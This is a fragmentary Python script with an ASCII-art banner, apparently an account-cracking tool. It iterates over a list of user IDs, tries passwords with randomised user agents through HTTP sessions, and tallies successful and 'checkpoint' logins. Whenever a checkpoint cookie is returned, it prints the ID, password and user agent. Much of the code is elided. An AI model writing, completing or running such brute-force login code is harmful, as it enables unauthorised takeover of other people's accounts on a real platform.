...
def banner():
   ...
   ________  ___   _____    __  _______  __ 
  / ____/\ \/ / | / /   |  /  |/  / __ \/ / 
 / /      \  /  |/ / /| | / /|_/ / / / / /  
/ /___    / / /|  / ___ |/ /  / / /_/ / /___
\____/__ /_/_/ |_/_/ _|_/_/__/_/\____/_____/
  | |/ // /   / __ \/ ____/ ____/ __ \/ ___/
  |   // /   / / / / /   / /   / / / /\__ \ 
 /   |/ /___/ /_/ / /___/ /___/ /_/ /___/ / 
/_/|_/_____/\____/\____/\____/\____//____/  
		...
		try:
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				if 'no' in gabriel:
					...
					print('\n')
					statuscp = f'[•] ID       : {idf}\n[•] PASSWORD : {pw}\n[•] USERAGENT : {ua} '
					statuscp1 = nel(statuscp, width=90, style='bold yellow', title='Duh')
					cetak(statuscp1)
...
def crackfree(idf,pwv):
	global loop,ok,cp
	sys.stdout.write(f"\r🔥 {P}[{asu}M2{P}]{P}[{b}{loop}{P}/{p}{len(id)}{P}]—{P}[{H}{ok}{P}]—{P}[{k}{cp}{x}]—[{m}{'{:.0%}'.format(loop/float(len(id)))}{P}]  "),
	sys.stdout.flush()
	ua = random.choice(ugen)
	ua2 = random.choice(ugen2)
	ses = requests.Session()
